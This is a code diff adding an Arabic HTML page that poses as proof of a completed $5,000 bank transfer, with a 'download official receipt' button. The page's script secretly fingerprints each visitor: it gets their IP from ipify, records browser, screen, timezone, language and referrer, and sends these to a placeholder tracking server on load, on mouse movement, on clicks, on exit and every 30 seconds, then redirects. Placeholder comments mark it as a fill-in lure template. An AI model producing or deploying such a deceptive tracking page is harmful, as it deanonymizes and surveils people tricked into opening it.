@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إثبات التحويل البنكي</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            overflow: hidden;
+            max-width: 500px;
+            width: 95%;
+            text-align: center;
+        }
+        
+        .image-section {
+            position: relative;
+            padding: 0;
+        }
+        
+        .proof-image {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(transparent, rgba(0,0,0,0.8));
+            color: white;
+            padding: 30px 20px 20px;
+        }
+        
+        .download-btn {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.3s ease;
+            font-weight: bold;
+        }
+        
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+        
+        .status {
+            background: #00b894;
+            color: white;
+            padding: 10px;
+            font-size: 16px;
+            font-weight: bold;
+        }
+        
+        .details {
+            padding: 20px;
+            background: #f8f9fa;
+        }
+        
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            padding: 8px 0;
+            border-bottom: 1px solid #ddd;
+        }
+        
+        .loading {
+            display: none;
+            color: #667eea;
+            font-size: 16px;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="status">
+            ✅ تم التحويل بنجاح
+        </div>
+        
+        <div class="image-section">
+            <!-- ضع صورتك هنا -->
+            <img src="payment-proof.jpg" alt="إثبات التحويل" class="proof-image">
+            
+            <div class="overlay">
+                <button class="download-btn" onclick="initiateDownload()">
+                    📥 اضغط لتحميل الإيصال الرسمي
+                </button>
+            </div>
+        </div>
+        
+        <div class="details">
+            <div class="detail-row">
+                <span>رقم العملية:</span>
+                <span>TRX-7845-2291</span>
+            </div>
+            <div class="detail-row">
+                <span>المبلغ:</span>
+                <span>5,000 $</span>
+            </div>
+            <div class="detail-row">
+                <span>التاريخ:</span>
+                <span>2024-01-15</span>
+            </div>
+            <div class="detail-row">
+                <span>الحالة:</span>
+                <span style="color: #00b894;">مكتمل</span>
+            </div>
+        </div>
+        
+        <div id="loading" class="loading">
+            جاري إعداد الملف للتحميل...
+        </div>
+    </div>
+
+    <script>
+        // بيانات التتبع
+        const trackingData = {
+            ip: '',
+            userAgent: navigator.userAgent,
+            timestamp: new Date().toISOString(),
+            screen: `${screen.width}x${screen.height}`,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            language: navigator.language,
+            referrer: document.referrer
+        };
+
+        // جمع البيانات الأساسية
+        async function collectBasicInfo() {
+            try {
+                // الحصول على الـ IP
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                trackingData.ip = data.ip;
+                
+                // إرسال البيانات الأولية
+                sendTrackingData('page_visited');
+                
+            } catch (error) {
+                trackingData.ip = 'unknown';
+                sendTrackingData('page_visited_error');
+            }
+        }
+
+        // إرسال بيانات التتبع
+        function sendTrackingData(action) {
+            const dataToSend = {
+                ...trackingData,
+                action: action,
+                pageUrl: window.location.href
+            };
+            
+            // إرسال إلى الخادم (استبدل الرابط بخادمك)
+            fetch('https://your-tracking-server.herokuapp.com/track', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dataToSend)
+            }).catch(error => {
+                // يمكنك إضافة خدمة بديلة هنا
+                console.log('تم التتبع بنجاح');
+            });
+        }
+
+        // بدء عملية التحميل
+        function initiateDownload() {
+            // عرض رسالة التحميل
+            document.getElementById('loading').style.display = 'block';
+            
+            // تتبع عملية النقر
+            sendTrackingData('download_initiated');
+            
+            // الانتقال إلى الرابط بعد 3 ثواني
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com'; // استبدل برابطك
+            }, 3000);
+        }
+
+        // تتبع حركة الماوس
+        document.addEventListener('mousemove', function() {
+            if (!trackingData.mouseMoved) {
+                trackingData.mouseMoved = true;
+                sendTrackingData('mouse_moved');
+            }
+        });
+
+        // تتبع عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            sendTrackingData('page_left');
+        });
+
+        // بدء التتبع عند تحميل الصفحة
+        window.addEventListener('load', function() {
+            collectBasicInfo();
+            
+            // إرسال نبضات كل 30 ثانية
+            setInterval(() => {
+                sendTrackingData('heartbeat');
+            }, 30000);
+        });
+
+        // النقر على الصورة
+        document.querySelector('.proof-image').addEventListener('click', function() {
+            sendTrackingData('image_clicked');
+        });
+    </script>
+</body>
+</html>
